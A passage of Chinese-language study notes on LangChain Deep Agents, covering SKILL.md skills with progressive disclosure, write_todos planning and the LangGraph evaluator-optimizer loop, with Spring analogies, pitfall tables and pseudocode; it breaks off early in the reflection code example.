- 本地 `@tool`：**高频、轻量、和 Agent 同进程**的工具（字符串处理、简单计算）。零协议开销，最快。
- MCP：**重活、要跨 Agent/跨语言复用、工具本身是独立服务**（查 DB、调外部 API、跑报表）。值得付协议开销换解耦和复用。
- 万物云选自建而非官方 SDK：🟢 确认是自建、只实现 tools/list+tools/call 子集；🔴 推测理由是"更轻、只实现需要的、避免引入完整 SDK 依赖"，但源文档没明说，标🔴。代价是自己要补握手/错误码/会话管理这些官方已封好的东西。

**第29步核心记忆点**：MCP = 工具调用的 JSON-RPC 标准协议；三大原语 Tools/Resources/Prompts；两传输 stdio（本地子进程）/Streamable HTTP（远程）；`tools/list` 发现 + `tools/call` 调用是核心；万物云自建只实现这两个等价，没用官方 SDK。

---

### 第30步：SKILL.md（Deep Agents skill 机制）

> 一句话定位：SKILL.md 是 Deep Agents 把"专家操作手册"按目录打包、用渐进式披露按需加载的能力单元；遵循 Agent Skills 标准（agentskills.io），由 SkillsMiddleware 在系统提示注入元数据、LLM 在任务匹配时读取正文。🟢 docs.langchain.com/oss/python/deepagents/skills

#### 为什么重要（痛点先讲）

**痛点1：System prompt 膨胀**
一个 Agent 要兼顾"写SQL + 审合同 + 导PDF + 查文档"四种专家能力，若把所有指令一次性塞进 system prompt，token 几千上万，每次调用都付费，且与当前任务无关的指令稀释 LLM 注意力。
后端类比（🟡）：相当于 Spring 把所有 Service 的实现代码都塞进一个 Controller 方法体，每次请求都加载全部字节码，GC 压力大、JIT 优化失效。

**痛点2：重复下达相同指令**
同一个工作流（"先查库→清洗→生成报告"）每次会话都要人工重述一遍，没法沉淀。
后端类比（🟡）：每次写 Controller 都要重新手写事务模板，没有 `@Transactional` 注解复用。

**痛点3：团队协作分裂**
法务团队、数据团队各自维护自己的专家知识，但都希望同一个 Agent 能用上。
后端类比（🟡）：多个团队各自维护 jar 包，靠 Maven coordinates 复用。

SKILL.md 解决：把专家指令按目录封装，启动只加载 frontmatter（name + description 几十 token），任务匹配时才读正文 + 引用脚本/参考文档，多团队可独立维护各自 skill 目录。

#### 概念（是啥）

SKILL.md 是 Deep Agents 的"能力单元文件"，一个 skill = 一个目录（🟢 官方）：

```
skills/
└── arxiv-search/        # skill 目录名 = frontmatter 的 name
    ├── SKILL.md         # 必需：YAML frontmatter + markdown 指令
    ├── scripts/         # 可选：可执行脚本（Python/Bash/JS）
    ├── references/      # 可选：详细参考文档
    └── assets/          # 可选：静态资源（模板、图片、查表）
```

SKILL.md 文件结构（🟢 官方示例）：

```markdown
---
name: arxiv-search
description: Search the arXiv preprint repository for research papers. Use when the user asks about academic papers, recent research, or scientific literature.
license: MIT
compatibility: Requires internet access for fetching documentation URLs
metadata:
  author: langchain
  version: "1.0"
allowed-tools: fetch_url
---
# arxiv-search
Search arXiv for papers matching the user's query.

## Instructions
1. Run `scripts/search.py` with the user's query as an argument.
2. Parse the results and present them with title, authors, abstract summary, and link.
3. If the user asks for more detail on a specific paper, fetch the full abstract.
```

frontmatter 字段（🟢 Agent Skills 规范）：

| 字段 | 必需 | 约束 | 用途 |
|---|---|---|---|
| name | 是 | 小写字母+数字+连字符，1-64 字符，**必须等于父目录名** | skill 唯一标识 |
| description | 是 | 最多 1024 字符 | 启动时唯一暴露给 LLM 的信息，决定是否激活 |
| license | 否 | - | 许可证 |
| compatibility | 否 | 最多 500 字符 | 环境要求（系统包、网络） |
| metadata | 否 | key-value | 任意附加属性 |
| allowed-tools | 否 | 空格分隔 | 预批准工具列表（实验性） |

硬约束（🟢）：
- SKILL.md 文件 < 10MB，超过在 discovery 阶段被静默跳过
- 推荐 body < 500 行 / < 5000 tokens（详细内容移到 references/）

#### 深入（机制/原理，带三色）

**渐进式披露（progressive disclosure）三层**（🟢 官方表格）：

| 层级 | 加载内容 | 加载时机 | 由谁处理 |
|---|---|---|---|
| 1. Metadata | frontmatter 的 name + description | Agent 启动，对每个配置的 skill | SkillsMiddleware 注入 system prompt |
| 2. Instructions | SKILL.md 全文 body | skill 被激活时（LLM 判断任务匹配 description） | LLM 调 read_file 读 SKILL.md |
| 3. Resources | scripts/ references/ assets/ 下的文件 | body 指令引用到才读 | LLM 调 read_file 按需读 |

运行时流程：启动时 system prompt 里只有所有 skill 的 name+description（层级1），token 开销极小。当用户问"帮我搜 arXiv 上的量子计算论文"，LLM 看到 `arxiv-search` 的 description 匹配，调 read_file 读 SKILL.md 全文（层级2），读到 "Run scripts/search.py" 再调 read_file 读脚本（层级3）。

机制关键点（🟢）：
1. SkillsMiddleware 是 default middleware stack 的一部分，当你传 `skills=` 参数时自动启用
2. 层级1：middleware 扫描 skills 路径，解析每个 SKILL.md frontmatter，注入 name+description 到 system prompt
3. 层级2：**LLM 自己决定**何时 read_file SKILL.md（不是 middleware 主动推）—— 这点很关键
4. 层级3：LLM 按 SKILL.md 指令引用 scripts/references/assets，也是 read_file 主动读
5. 路径必须用正斜杠 `/`，相对于 backend 根
6. 多 source 同名 skill：last wins（后面 source 覆盖前面）

后端类比（🟡）：像 Spring 的 `@ConditionalOnProperty` 延迟初始化 Bean —— 启动只注册 BeanDefinition（=层级1 metadata），首次注入才实例化（=层级2 body），依赖的 `@Lazy` 子 Bean 用到才加载（=层级3 resources）。

**预判疑问（一口气讲透）**：

**Q1：skill 是同步还是异步加载？**
层级1 metadata 在 agent 启动时由 SkillsMiddleware **同步**扫描注入（一次性，进入 system prompt）。层级2/3 是 LLM 在对话中调 read_file，read_file 本身是工具调用，**同步阻塞**等待文件内容返回。但整个 agent 的 `ainvoke` 支持 asyncio，外层可异步。🟢

**Q2：LLM 怎么知道要 read_file SKILL.md？是 middleware 强制的吗？**
不是强制。🟢 官方原文："the agent reads the full SKILL.md content via read_file" —— 是 LLM 看到 description 匹配后**自发**调用 read_file。所以 description 写得模糊，LLM 可能不激活（见"生产注意"）。

**Q3：skill 能调工具吗？能跑脚本吗？**
能。SKILL.md body 可以指示 LLM 调任何已注册工具。要跑 scripts/ 下的脚本，**必须有 sandbox backend**（提供 execute 工具），普通 backend 只能 read_file 读脚本内容但不能执行。🟢

**Q4：skill 和 memory(AGENTS.md) 和 tools 的区别？**
🟢 官方对比表：

| 维度 | Skills | Memory (AGENTS.md) | Tools |
|---|---|---|---|
| 用途 | 按需发现的能力 | 启动加载的持久上下文 | 每轮可调的程序动作 |
| 加载 | 相关时才读 | 启动时全读 | 每轮可用 |
| 格式 | SKILL.md 目录 | AGENTS.md 文件 | 绑定到 agent 的函数 |
| 分层 | user→project (last wins) | user→project (combined) | agent 创建时定义 |

**Q5：和 multi-agent Skills 模式（load_skill tool）什么关系？**
🟢 官方 ma_skills.txt：multi-agent Skills 模式是抽象模式，用 `load_skill(skill_name)` tool 手动实现渐进式披露；Deep Agents 的 SKILL.md 是这个模式的"内置实现"，用 SkillsMiddleware + read_file 替代手写 load_skill。两者都遵循 Agent Skills 标准，概念同源。可以用 `create_agent` 自己实现 load_skill（万物云场景），也可以用 `create_deep_agent` 直接享受内置 SKILL.md。

#### 生产实战（伪代码 + 逐行解释，每行注释）

场景：万物云物业工单系统，给 Agent 配两个 skill：
- `workorder-triage`：工单分诊（按 urgency 分流）
- `knowledge-lookup`：查物业知识库

目录结构：
```
/app/property-agent/skills/
├── workorder-triage/
│   ├── SKILL.md
│   └── references/
│       └── urgency-rules.md      # 详细分诊规则
└── knowledge-lookup/
    ├── SKILL.md
    └── scripts/
        └── search_kb.py          # 调内部知识库 API 的脚本
```

**skill 1 - workorder-triage/SKILL.md**：
```markdown
---
name: workorder-triage
description: Triage property work orders by urgency and route to the right team. Use when the user submits a new work order, asks about SLA, or mentions words like "漏水/电梯/消防/停电".
metadata:
  author: wanwuyun-property
  version: "1.2"
---
# workorder-triage
Triage incoming work orders.

## Instructions
1. Read the work order content from user input.
2. Classify urgency by the rules in references/urgency-rules.md (read it first).
3. Output JSON: {"urgency": "P0|P1|P2", "team": "...", "reason": "..."}.
4. For P0 (fire/electric leak/elevator trapped), also call send_alert tool immediately.
```

**skill 2 - knowledge-lookup/SKILL.md**：
```markdown
---
name: knowledge-lookup
description: Search the internal property knowledge base for SOPs, equipment manuals, and regulations. Use when the user asks "怎么做/规定/手册/SOP" or mentions specific equipment.
allowed-tools: search_kb
---
# knowledge-lookup
Search the property KB.

## Instructions
1. Run `scripts/search_kb.py "<query>"` to fetch top-5 KB entries.
2. Summarize each entry with title + 2-sentence snippet + source URL.
3. If no result, say "知识库未命中" and suggest asking human.
```

**加载伪代码（Deep Agents 内置 SkillsMiddleware）**：
```python
from deepagents import create_deep_agent
from deepagents.backends.filesystem import FilesystemBackend
from langgraph.checkpoint.memory import MemorySaver

backend = FilesystemBackend(root_dir="/app/property-agent")  # backend 根目录，skill 从磁盘读

agent = create_deep_agent(
    model="anthropic:claude-sonnet-4-6",                      # 生产用 Claude
    backend=backend,                                          # 文件系统后端
    skills=["/skills/"],                                      # 🟢 传 skill 源路径（相对 backend 根，正斜杠）
    tools=[send_alert],                                       # 业务工具：P0 告警
    checkpointer=MemorySaver(),                               # 启用 checkpointer 支持 interrupt
    interrupt_on={"write_file": True},                        # 写文件前人工审核
)

result = agent.invoke(
    {"messages": [{"role": "user", "content": "11栋电梯困人，快处理"}]},
    config={"configurable": {"thread_id": "wo-2026-0713-001"}},
)
```

逐行解释：
- `backend=FilesystemBackend(root_dir="/app/property-agent")`：文件系统后端，skill 文件从磁盘 `/app/property-agent/skills/` 读。🟢 也可用 StateBackend（放 agent state，按 thread 隔离）或 StoreBackend（放 LangGraph store，跨 thread 持久）
- `skills=["/skills/"]`：传一个或多个 skill 源路径。middleware 启动时扫描该路径下所有子目录，每个含 SKILL.md 的子目录算一个 skill。🟢
- `tools=[send_alert]`：业务工具，skill body 里指示 LLM 调它
- `checkpointer=MemorySaver()`：必须，因为 `interrupt_on` 需要 checkpointer 暂停/恢复
- `interrupt_on={"write_file": True}`：写文件前暂停人工审核，防止 skill 误改文件

**运行时流程**：
1. 启动：SkillsMiddleware 扫描 `/skills/`，把两个 skill 的 name+description 注入 system prompt（约 100 token）
2. 用户输入"11栋电梯困人"：LLM 看到 `workorder-triage` description 里有"电梯"，匹配
3. LLM 调 `read_file("/skills/workorder-triage/SKILL.md")` 读全文（层级2）
4. SKILL.md 指示先读 `references/urgency-rules.md`，LLM 调 `read_file("/skills/workorder-triage/references/urgency-rules.md")`（层级3）
5. 按 rules 判定 P0，输出 JSON，调 `send_alert` 工具

**手动实现 load_skill（multi-agent Skills 模式，万物云场景用 create_agent）**：
```python
from langchain.tools import tool
from langchain.agents import create_agent
import os

SKILLS_DIR = "/app/property-agent/skills"  # skill 根目录

@tool
def load_skill(skill_name: str) -> str:
    """Load a specialized skill prompt.
    Available skills:
    - workorder-triage: Triage property work orders by urgency
    - knowledge-lookup: Search internal property knowledge base
    Returns the skill's prompt and context.
    """
    skill_path = os.path.join(SKILLS_DIR, skill_name, "SKILL.md")  # 拼 SKILL.md 路径
    if not os.path.exists(skill_path):                              # 防御：skill 不存在
        return f"Skill {skill_name} not found"
    with open(skill_path, "r", encoding="utf-8") as f:              # 读 SKILL.md 全文
        return f.read()                                             # 返回正文给 LLM

agent = create_agent(
    model="anthropic:claude-sonnet-4-6",
    tools=[load_skill, send_alert],                                 # 把 load_skill 作为工具暴露
    system_prompt=(
        "You are a property work order agent. "
        "You have access to two skills: workorder-triage and knowledge-lookup. "
        "Use load_skill to access them when relevant."
    ),
)
```

这是 multi-agent Skills 模式（🟢 ma_skills.txt 原文模式）的手动实现。万物云若用 StateGraph + create_agent 自建，会走这条路径 —— 但万物云实际是否这么做了 🔴 待核（口径表里没明确说万物云用了 skill 机制）。

#### 生产注意（坑 + 对策，表格或列表）

| 坑 | 现象 | 对策 | 来源 |
|---|---|---|---|
| description 太模糊 | LLM 不激活 skill，直接答或调错 skill | description 写清"做什么+何时用+关键词"，例:"Use when user mentions 漏水/电梯/消防" | 🟢 官方 Troubleshooting |
| skill 描述重叠 | 多个 skill description 相似，LLM 犹豫选错 | 合并相关 skill 为一个带 sections，或显式差异化描述 | 🟢 |
| SKILL.md > 10MB | discovery 阶段被静默跳过 | 拆分，详细内容移到 references/ | 🟢 |
| body 过长 | 激活时 token 暴涨 | body < 500 行 / < 5000 tokens，详细内容移 references/ | 🟢 |
| 同名 skill 多 source | 后面 source 覆盖前面的（last wins），可能被空 skill 覆盖 | 检查 skills 列表顺序，确认每个 source 内容非空 | 🟢 |
| 子 agent 拿不到 skill | custom subagent 不继承主 agent skill | 在 subagent 定义里显式加 `skills=[...]` 参数 | 🟢 |
| 脚本跑不了 | scripts/ 下的 .py LLM 只能读不能执行 | 必须配 sandbox backend（提供 execute 工具），并用 middleware 把 skill 文件 sync 进 sandbox | 🟢 |
| references 找不到 | LLM 不知道有哪些支持文件 | SKILL.md body 里显式引用 `references/xxx.md` 并说明何时读 | 🟢 |
| skill 被误改 | LLM 用 write_file 改 SKILL.md | permissions 加 `FilesystemPermission(operations=["write"], paths=["/skills/**"], mode="deny")` | 🟢 |
| 改 skill 要审批 | 想让 LLM 改 personal skill 但要人工把关 | permissions 用 `mode="interrupt"` 或 `interrupt_on={"write_file": True, "edit_file": True}` | 🟢 |
| 多租户 skill 串 | A 用户看到 B 用户的 skill | 用 StoreBackend + namespace factory 按 user_id 隔离 | 🟢 |
| 启动 skill 不出现 | 路径错或 frontmatter name 不等于目录名 | 路径用正斜杠相对 backend 根；name 必须等于父目录名 | 🟢 |
| skill 没缓存 | 每轮 read_file SKILL.md 重复耗 token | Anthropic/Bedrock 模型默认开 prompt caching，静态 system prompt 段（含 skill content）自动缓存 | 🟢 |
| 安全：scripts 注入 | LLM 被诱导跑恶意脚本 | sandbox backend 隔离 + 限制网络/文件访问；scripts 自包含、显式声明依赖 | 🟡 通用安全实践 |

#### 后端类比（表格）

| Agent 概念 (SKILL.md) | 后端类比 (Spring/Activiti/Redis/JUC) | 说明 |
|---|---|---|
| SKILL.md 目录 | Spring Boot 的 `META-INF/spring.factories` + AutoConfiguration 类 | 一个目录 = 一个自动配置单元，按需加载 |
| frontmatter (name+description) | Spring BeanDefinition（只有元数据，未实例化） | 启动时注册元数据，不加载实现 |
| 渐进式披露三层 | `@Lazy` + `@ConditionalOnProperty` | 元数据注册→首次注入实例化→依赖按需加载 |
| SkillsMiddleware | BeanPostProcessor / `@EnableAutoConfiguration` | 框架内置的扫描注册器 |
| read_file SKILL.md | `ApplicationContext.getBean(name)` 首次触发实例化 | 用到才真正加载实现 |
| scripts/ 可执行脚本 | Bean 里注入的 `@Bean Method` | 可调用的逻辑单元 |
| references/ 参考文档 | classpath: 下的 `.properties` / `.yml` 配置 | 详细参数表，按需读 |
| assets/ 静态资源 | `src/main/resources/static/` 下静态文件 | 模板、查表，不作为指令 |
| 多 source last wins | Spring `@Order` + 后注册的 BeanDefinition 覆盖前者 | 后面 source 同名覆盖前面 |
| subagent 不继承 skill | Spring 子上下文不继承父上下文的 prototype Bean | 隔离的依赖图，需显式声明 |
| permission deny `/skills/**` | Spring Security 的 `antMatchers("/skills/**").denyAll()` | 路径级访问控制 |
| `interrupt_on` write_file | Activiti 的 UserTask（人工节点）暂停流程 | 写操作前人工审批，再 resume |
| prompt caching | Redis 缓存序列化的 Bean | 静态段不重复计算 |
| description 模糊不激活 | `@ConditionalOnMissingBean` 表达式不匹配 | 条件不满足，Bean 不实例化 |
| SKILL.md > 10MB 跳过 | Spring 启动时 classpath 扫描跳过超大 jar | 静默跳过，要看日志才知道 |
| allowed-tools 预批准 | Spring Security `@PreAuthorize("hasRole('X')")` | 限定 skill 可调工具白名单 |

#### 万物云口径（按真实，三色标注，没明确说的标🔴不编）

| 维度 | 万物云口径 | 颜色 |
|---|---|---|
| 是否用 Deep Agents | 没用 create_deep_agent，用 StateGraph + create_agent 自建 | 🟢 用户2026-07-08立场 |
| 是否用 SKILL.md | 没用 SKILL.md 文件机制（SKILL.md 是 Deep Agents 内置能力，万物云没用 Deep Agents） | 🔴 推断（基于"万物云没用 Deep Agents"，万物云没明确说） |
| 是否用 SkillsMiddleware | 没用（SkillsMiddleware 是 Deep Agents 的 default middleware） | 🔴 推断（同上） |
| 专家知识怎么注入 | 万物云用 StateGraph 子 agent 隔离不同业务领域（如分诊子图、查询子图），子 agent 各自带 system_prompt；不是用 SKILL.md 按需加载 | 🔴 推断（口径表没明确说万物云怎么管理专家知识，基于 StateGraph 子 agent 模式推断） |
| 渐进式披露 | 万物云若要按需加载知识，更可能用 RAG（pgvector 检索）+ 子 agent system_prompt，而非 SKILL.md 三层披露 | 🔴 推断 |
| 人工审核改 skill | 万物云人工审核走 interrupt_before（静态），不是 SKILL.md 的 mode="interrupt" | 🟢 万物云人工审核口径 |
| 长期记忆 | 万物云用 pgvector + similar merge + TTL，不是 AGENTS.md（AGENTS.md 是 Deep Agents 的 memory 机制） | 🟢 万物云长期记忆口径 |
| multi-agent Skills 模式（load_skill tool） | 万物云是否手写 load_skill 工具未明确 | 🔴 待核 |

**结论**：万物云没明确说用了 SKILL.md，根据"万物云没用 Deep Agents"推断万物云也没用 SKILL.md 机制。万物云的专家知识管理更可能是：StateGraph 子 agent 隔离 + 各子 agent system_prompt + pgvector RAG 检索。🔴 待核，不编。若未来万物云要加 skill 机制，要自己实现 load_skill tool（multi-agent Skills 模式手动版），承担 SkillsMiddleware 的扫描/注入逻辑。

#### 第30步检查题（5道，含预判疑问）

**1. (机制) SKILL.md 的渐进式披露分三层，每层加载什么、由谁处理？为什么这样设计能省 token？**
预判疑问：为什么不一次性全加载？答：层级1 metadata 几十 token 常驻 system prompt（每轮都付费），层级2/3 可能几千 token 但只在用到时付一次。若 20 个 skill 全加载，每轮多付几万 token；分层后每轮只付 metadata 的几百 token。层级1 由 SkillsMiddleware 处理，层级2/3 由 LLM 调 read_file 处理。

**2. (传参) `skills=["/skills/"]` 里的路径是相对于什么？为什么必须用正斜杠？如果两个 source 都有 `workorder-triage` 会怎样？**
预判疑问：路径相对于 backend 根（FilesystemBackend 的 root_dir，或 StateBackend 的虚拟根 `/`）。正斜杠是规范要求（🟢 官方原文"Paths must be specified using forward slashes"）。同名 last wins —— 后面 source 的覆盖前面的，可能被空 skill 覆盖，要检查顺序。

**3. (激活) LLM 在什么时机决定 read_file SKILL.md？description 写"Helps with PDFs"会有什么问题？怎么改？**
预判疑问：LLM 在启动后看到 system prompt 里所有 skill 的 name+description，根据用户输入匹配 description 决定是否 read_file（不是 middleware 强制）。"Helps with PDFs" 太模糊，LLM 可能不激活或调错。改为："Extract text and tables from PDF files, fill PDF forms, merge PDFs. Use when working with PDF documents or when the user mentions PDFs, forms, or document extraction."（🟢 官方 Good 示例）

**4. (子 agent) custom subagent 默认能用到主 agent 的 skill 吗？general-purpose subagent 呢？skill 状态隔离是什么意思？**
预判疑问：🟢 custom subagent **不**继承主 agent skill，要在 subagent 定义里显式加 `skills=[...]` 参数；general-purpose subagent **自动**继承主 agent skill。skill 状态隔离 = 主 agent 的 loaded skills 对子 agent 不可见，子 agent 的 loaded skills 也不会回传给主 agent，双向隔离。只有配了 skills 的 subagent 才有自己的 SkillsMiddleware 实例。

**5. (万物云口径 + 生产坑) 万物云用 SKILL.md 吗？为什么？如果万物云想实现"按需加载专家知识"，更可能用什么方案？**
预判疑问：🔴 万物云没用 SKILL.md（因为没用 Deep Agents，SKILL.md 是 Deep Agents 内置能力，万物云用 StateGraph + create_agent 自建）。万物云更可能用 StateGraph 子 agent 隔离 + 各子 agent system_prompt + pgvector RAG 检索。这是推断，万物云没明确说，标🔴不编。生产坑：若万物云未来要加 skill 机制，要自己实现 load_skill tool（multi-agent Skills 模式手动版），承担 SkillsMiddleware 的扫描/注入逻辑，且要注意 description 模糊不激活、多 source last wins 覆盖、scripts 需要 sandbox 才能执行等坑。

---

### 第31步：planning（write_todos）与反思

> 一句话定位：本步讲 Deep Agents 内置规划工具 `write_todos`（🟢官方确认）+ LangGraph 反思工作流 `evaluator-optimizer`（🟢官方确认，官方不叫"Reflection"）。两者解决同一个问题的两面：agent 如何自己拆任务、自己改自己。三色来源：🟢官方文档确认 / 🟡通用网文或后端类比 / 🔴推断或待核。

---

#### 为什么重要（痛点先讲）

长 task 跑到一半就废，废的方式就两种：

1. **没规划，跑着跑着忘了目标**。LLM 是无状态的，每一步只看当前上下文。一个 10 步的研究任务，跑到第 7 步时第 2 步的关键约束可能已被中间 5 步的 tool 输出挤到上下文边缘，LLM 就开始跑偏——要么重复查、要么漏条件。你做 Java 后端应该见过这种代码：一个 service 方法 500 行，没有拆子方法，改到第 300 行时已经忘了第 50 行定义的变量是干嘛的。planning 就是给 agent 一张"显式的任务清单"，每做完一项勾掉一项，目标始终可见。

2. **一锤子买卖，结果不达标没办法修**。LLM 生成第一版答案，如果不对，没有机制让它"看了反馈再改一版"。后端类比：Spring 里调一个外部接口拿数据，数据不达标你就重试 + 改参数，不可能调一次失败就放弃。反思工作流就是把"生成-评估-反馈-重生"做成一个循环，直到达标或撞上限。

这两个痛点决定了 agent 能不能做"长且需要质量"的任务。短任务（一次 tool call 就搞定）用不上这两样；但凡任务超过 3 步、或者对输出有明确质量标准，planning 和反思就是刚需。

---

#### 概念（是啥）

**planning（这里特指 Deep Agents 的 write_todos）**：agent 在执行过程中，调用一个内置工具 `write_todos`，维护一个结构化的任务清单。每个任务有状态：`pending` / `in_progress` / `completed`，清单持久化在 agent state 里，跨步骤不丢。它不是"执行前一次性生成完整计划"那种重型规划，而是"边走边维护"的轻量规划层。🟢（来源：deepagents_overview）

**反思（这里特指 LangGraph 的 evaluator-optimizer 工作流）**：一个 LLM 调用生成响应，另一个 LLM 调用评估这个响应；评估不过就带 feedback 回到生成器重生，循环到评估通过为止。官方原文："one LLM call creates a response and the other evaluates that response. If the evaluator or a human-in-the-loop determines the response needs refinement, feedback is provided and the response is recreated. This loop continues until an acceptable response is generated." 🟢（来源：workflows-agents 页）

两者的关系：planning 管"做什么、什么顺序"，反思管"做得够不够好"。它们是正交的，可以单独用，也可以组合——一个有反思循环的 agent，每个 todo 项执行完都可以走一次 evaluator-optimizer。

---

#### 深入（机制/原理，带三色）

**1. write_todos 的机制**

- `write_todos` 是 Deep Agents 的内置 harness 工具，官方工具表里描述："Manage a structured todo list" 🟢（来源：deepagents tools 页）
- 提供它的是 `TodoListMiddleware`，官方原文："Tracks and manages todo lists for organizing agent tasks and work." 🟢（来源：deepagents customization 页）
- `TodoListMiddleware` 是默认中间件栈的**第一个**，排在 SkillsMiddleware、FilesystemMiddleware、SubAgentMiddleware 之前 🟢（来源：deepagents customization 页的 "Default stack (main agent)"）。这个位置很关键——规划能力是地基，先于一切。
- 任务状态枚举：`'pending'` / `'in_progress'` / `'completed'` 🟢（来源：deepagents overview）
- 任务"persisted in agent state"——持久化在 agent state 里，跨 superstep 不丢 🟢（来源：deepagents overview）
- **write_todos 的完整参数 schema（字段名、除 status 外的字段）官方文档没给完整字段表** 🔴（待核）。我看到的只有状态枚举和"持久化在 state"这一句。下面伪代码里我会用合理的字段名（如 `content`、`status`），但具体字段名标🔴不保证准确。

预判疑问：
- **Q: write_todos 和 subagents 的 task 工具有什么区别？** 🟢 官方把它们都放在 "Delegation" 组件下，但分工不同：`write_todos` 是给主 agent 自己维护任务清单（轻量、自用），`task` 工具是派生子 agent 去执行隔离的子任务（重量、隔离上下文）。write_todos 是"记账"，task 是"派人"。
- **Q: 谁来决定何时调用 write_todos？** 🟡 是 LLM 自己决定的——write_todos 作为一个 tool 暴露给模型，模型在 system prompt 引导下自己判断"这个任务够复杂，我先把待办写下来"。这不是硬编码的流程，是模型自主行为。
- **Q: 清单是全局的还是每个 agent 一份？** 🟡 每个 agent 实例有自己的 state，所以主 agent 和它的 subagent 各自维护各自的 todo list（subagent 的 state 是隔离的，这在第30步讲过）。

**2. evaluator-optimizer（反思）的机制**

官方工作流结构（🟢 workflows-agents 页原文）：
```
START -> llm_call_generator -> llm_call_evaluator -> [conditional edge]
                                                        ├─ "Accepted" -> END
                                                        └─ "Rejected + Feedback" -> llm_call_generator (回环)
```

关键点：
- 生成器 `llm_call_generator`：如果有 feedback 就带着 feedback 重新生成，否则首次生成 🟢
- 评估器 `llm_call_evaluator`：用 `llm.with_structured_output(Feedback)` 产出结构化评估结果 🟢
- 条件边 `route_joke`（官方示例名）：根据评估结果路由，Accepted 走 END，Rejected+Feedback 回生成器 🟢
- 核心三件套 API：`llm.with_structured_output(Feedback)` + `add_conditional_edges` + `StateGraph` 的循环结构 🟢

预判疑问：
- **Q: 为什么官方不叫 Reflection？** 🟢 官方现在把这个模式命名为 evaluator-optimizer，归在 workflow 范畴（预定路径），不是 agent 范畴（自主决策）。旧版 "Reflection"/"Reflexion" 命名的概念页已下线，llms.txt 索引里 reflect/reflexion 都无匹配（来源：agent_pattern_reflection.txt 核实记录）。
- **Q: Reflection 和 Reflexion 什么区别？** 🟡 概念上：Reflection 是单层"生成后自评并改进"；Reflexion（Shinn et al. 2023 论文）是把反思记入 episodic memory 跨多次 trial 累积。当前官方 evaluator-optimizer 只覆盖单层循环，**Reflexion 式跨 trial 记忆累积官方文档没有** 🔴（来源：agent_pattern_reflexion.txt 核实记录，确认抓不到）。
- **Q: 评估器是自己评自己还是另一个模型？** 🟢 官方示例是同一个 `llm` 对象，但用不同的 prompt 和 structured output schema。生产里常见做法是评估器用更便宜/更快的模型（🟡 通用做法，文档没强制）。
- **Q: 循环怎么停？** 🟢 官方靠 evaluator 返回 Accepted；🟡 生产里必须加硬上限 `max_iterations`（自己加计数器在 state 里），否则 evaluator 永远 Reject 就死循环。框架层面的 `recursion_limit` 是兜底（万物云设 25，🟢 已确认万物云口径）。

**3. planning 与反思的组合**

两个层次可以叠加：一个带反思的 plan-execute agent，结构上是"先 write_todos 规划，再逐项执行，每项执行走 evaluator-optimizer 循环"。但这是组合用法 🔴（官方没有直接给这种组合的现成示例，是我基于组件能力推断）。官方最接近 plan-then-execute 的是 orchestrator-worker 工作流 🟢（来源：workflows-agents 页），但它用 `with_structured_output(Sections)` 一次性生成计划 + Send API 派发 worker，**不是** write_todos 那种边走边维护的轻量清单。

---

#### 生产实战（伪代码 + 逐行解释，每行注释）

**伪代码 1：Deep Agents 的 write_todos 规划（概念流程）**

下面展示一个 Deep Agent 在执行研究任务时，如何自主调用 write_todos。注意：write_todos 是模型自主调用的 tool，我们写的是"模型会怎么用"，不是"我们手动调"。

```python
# 伪代码：Deep Agent 执行多步研究任务时，模型自主调用 write_todos 的概念流程
# 注意：下面是模型在 tool call 里发出的参数结构，字段名(content等)🔴官方未给完整schema，仅 status 枚举🟢确认

agent = create_deep_agent(
    model="anthropic:claude-sonnet-4-6",          # 主模型
    tools=[web_search, fetch_page],               # 自定义工具：搜索+抓页
    system_prompt="""你是一个研究助手。遇到多步任务时，先用 write_todos 写待办清单，
    每完成一项立刻更新状态。每个 todo 要具体可执行。""",
    # write_todos 由 TodoListMiddleware 自动注入，不用你手动加 🟢
)

# 模型收到任务后，内部 tool call 序列（概念展示）：
# Step A: 模型先调用 write_todos 生成初始清单
# args（🔴字段名未官方确认，status枚举🟢确认）:
{
  "todos": [
    {"content": "搜索 LangGraph evaluator-optimizer 官方示例",   "status": "in_progress"},  # 🟢 status 枚举确认
    {"content": "抓取 workflows-agents 页面正文",                 "status": "pending"},
    {"content": "对比 reflection 与 evaluator-optimizer 差异",    "status": "pending"},
    {"content": "总结成 300 字报告",                              "status": "pending"},
  ]
}
# 模型把第一项标 in_progress，开始调 web_search

# Step B: web_search 返回结果后，模型更新清单
{
  "todos": [
    {"content": "搜索 LangGraph evaluator-optimizer 官方示例",   "status": "completed"},   # 完成的标 completed
    {"content": "抓取 workflows-agents 页面正文",                 "status": "in_progress"}, # 推进下一项
    {"content": "对比 reflection 与 evaluator-optimizer 差异",    "status": "pending"},
    {"content": "总结成 300 字报告",                              "status": "pending"},
  ]
}
# 每一步 superstep 后，TodoListMiddleware 把清单写进 agent state 🟢 持久化确认
# 模型下一轮看到的上下文里，清单始终可见 -> 不会忘目标

# Step C: 全部 completed 后，模型生成最终答案
```

逐行解释：
- `create_deep_agent(...)`：建 agent。`write_todos` 不用你手动注册，`TodoListMiddleware` 是默认栈第一个，自动注入 🟢。
- `system_prompt`：**关键**。write_todos 是模型自主调用的，你必须在 system prompt 里告诉模型"遇到多步任务先写清单"，否则模型可能直接开干不规划 🟡（文档没强制，但官方 subagents 页的 best practice 强调 system prompt 引导）。
- `todos` 数组：每个 todo 是一个对象，`content` 是任务描述（🔴字段名未官方确认），`status` 是状态枚举（🟢 pending/in_progress/completed 确认）。
- 每轮更新：模型调一次 write_todos 就是**整体替换**清单（🟡 推断，TodoListMiddleware 描述是 "Tracks and manages"，具体是替换还是增量🔴未确认；Anthropic 同类工具是整体替换，这里标推断）。
- 持久化：`TodoListMiddleware` 把清单写进 agent state，跨 superstep 不丢 🟢。这就是 planning 解决"跑着跑着忘目标"的机制——清单始终在上下文里。

**伪代码 2：LangGraph evaluator-optimizer 反思循环（StateGraph 实现）**

这是官方 workflows-agents 页的反射模式实现，逐行注释。🟢 API 全部官方确认。

```python
from typing_extensions import TypedDict, Literal
from pydantic import BaseModel, Field
from langgraph.graph import StateGraph, START, END

# 1. 定义 State：记录当前生成物 + 评估反馈 + 评估结论
class State(TypedDict):
    topic: str            # 任务输入（如笑话主题）
    joke: str             # 当前生成的笑话（生成器写）
    feedback: str         # 评估器给的改进反馈（评估器写）
    funny_or_not: str     # 评估结论：funny / not funny
    iter_count: int       # 🟡 自己加的迭代计数器，官方示例没有，生产必须加

# 2. 定义评估结构化输出 schema
class Feedback(BaseModel):
    grade: Literal["funny", "not funny"] = Field(description="笑话好不好笑")
    feedback: str = Field(description="如果不好笑，给改进建议")

